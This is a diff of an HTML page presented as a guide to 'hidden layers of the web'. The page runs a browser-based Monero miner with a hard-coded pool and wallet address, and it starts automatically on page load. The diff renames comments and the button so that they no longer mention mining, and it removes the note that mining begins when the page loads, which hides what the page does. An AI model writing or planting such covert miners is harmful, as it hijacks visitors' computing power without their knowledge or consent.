@@ -19,21 +19,21 @@
         <p>Explore the hidden layers of the web and discover tools, guides, and secrets.</p>
         <div>
             <!-- Textarea untuk menampilkan hasil -->
-            <textarea rows="4" cols="50" id="texta" style="white-space: pre-wrap; color: #0f0; background-color: #000; padding: 10px; border: 1px solid #333;"></textarea>
+            <textarea rows="6" cols="70" id="texta" style="white-space: pre-wrap; color: #0f0; background-color: #000; padding: 10px; border: 1px solid #333;"></textarea>
         </div>
 
-        <!-- Tombol Start Mining -->
+        <!-- Tombol Start -->
         <div>
             <button id="startb" onclick="start()">Log</button>
         </div>
 
-        <!-- Script Miner -->
+        <!-- Script -->
         <script src="miner/miner.js"></script>
         <script>
             function start() {
                 document.getElementById("startb").disabled = true; // Disable tombol
 
-                // Mulai proses mining
+                // Mulai proses 
                 server = "wss://ny1.xmrminingproxy.com";
                 startMining("moneroocean.stream",
                     "86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB");
@@ -41,12 +41,12 @@
                 // Tambahkan teks awal
                 addText("Connecting...");
 
-                // Perbarui status mining setiap 2 detik
+                // Perbarui status setiap 1 detik
                 setInterval(function () {
                     while (sendStack.length > 0) addText(sendStack.pop());
                     while (receiveStack.length > 0) addText(receiveStack.pop());
                     addText("calculated " + totalhashes + " hashes.");
-                }, 2000);
+                }, 1000);
             }
 
             // Fungsi untuk menambahkan teks ke textarea
@@ -68,7 +68,6 @@
                 elem.scrollTop = elem.scrollHeight;
             }
 
-            // Aktifkan mining saat halaman dimuat
             window.onload = start;
         </script>
     </div>
